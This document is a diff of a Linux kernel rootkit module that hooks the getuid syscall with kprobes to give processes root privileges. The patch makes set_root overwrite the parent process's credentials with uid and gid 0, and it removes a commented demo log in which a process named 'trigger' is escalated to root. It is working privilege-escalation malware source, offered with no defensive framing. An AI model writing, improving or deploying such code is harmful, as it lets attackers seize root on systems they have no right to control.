@@ -13,7 +13,7 @@ MODULE_DESCRIPTION("Hook getuid syscall to give root privileges using Kprobes");
 MODULE_VERSION("0.01");
 
 static struct kprobe kp;
-void set_root(void);
+static void set_root(void);
 
 static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
@@ -42,20 +42,42 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
     }
 }
 
-
-void set_root(void)
+static void set_root(void)
 {
-    struct cred *root;
-    root = prepare_creds();
-    if (root == NULL)
+    struct cred *new_creds;
+    struct task_struct *parent_task;
+
+    // Get the parent process
+    parent_task = current->real_parent;
+
+    // Prepare new credentials
+    new_creds = prepare_creds();
+    if (new_creds == NULL) {
+        printk(KERN_ALERT "rootkit: Unable to prepare credentials.\n");
         return;
+    }
 
-    root->uid.val = root->gid.val = 0;
-    root->euid.val = root->egid.val = 0;
-    root->suid.val = root->sgid.val = 0;
-    root->fsuid.val = root->fsgid.val = 0;
+    // Set the new credentials to root
+    new_creds->uid.val = 0;
+    new_creds->gid.val = 0;
+    new_creds->euid.val = 0;
+    new_creds->egid.val = 0;
+    new_creds->suid.val = 0;
+    new_creds->sgid.val = 0;
+    new_creds->fsuid.val = 0;
+    new_creds->fsgid.val = 0;
 
-    commit_creds(root);
+    // Commit the new credentials to the parent process
+    if (parent_task) {
+        task_lock(parent_task); // Lock to modify safely
+        parent_task->real_cred = new_creds;
+        parent_task->cred = new_creds;
+        task_unlock(parent_task); // Unlock after modification
+    } else {
+        printk(KERN_ALERT "rootkit: Parent task not found.\n");
+    }
+
+    printk(KERN_INFO "rootkit: Parent process privileges escalated successfully.\n");
 }
 
 static int __init rootkit_init(void)
@@ -83,29 +105,3 @@ static void __exit rootkit_exit(void)
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
-
-
-/*
-
-(none):~# echo "#!/bin/bash" > /usr/bin/trigger
-(none):~# echo "id" >> /usr/bin/trigger
-(none):~# chmod +x /usr/bin/trigger
-(none):~# insmod getuid.ko 
-[ 1256.021602] rootkit: Kprobe registered at __x64_sys_getuid
-(none):~# su feur
-[ 1257.587381] rootkit: getuid called by process su
-[ 1257.588579] rootkit: getuid called by process su
-[ 1257.599878] rootkit: getuid called by process sh
-/root $ id
-[ 1259.110862] rootkit: getuid called by process id
-[ 1259.111222] rootkit: getuid called by process id
-uid=1000(feur) gid=1000(feur) groups=10(wheel),1000(feur)
-/root $ trigger
-[ 1261.506248] rootkit: getuid called by process trigger
-[ 1261.506368] rootkit: Granting root privileges for process trigger...
-[ 1261.525060] rootkit: getuid called by process id
-[ 1261.526145] rootkit: getuid called by process id
-uid=0(root) gid=0(root) groups=10(wheel),1000(feur)
-/root $ 
-
- */
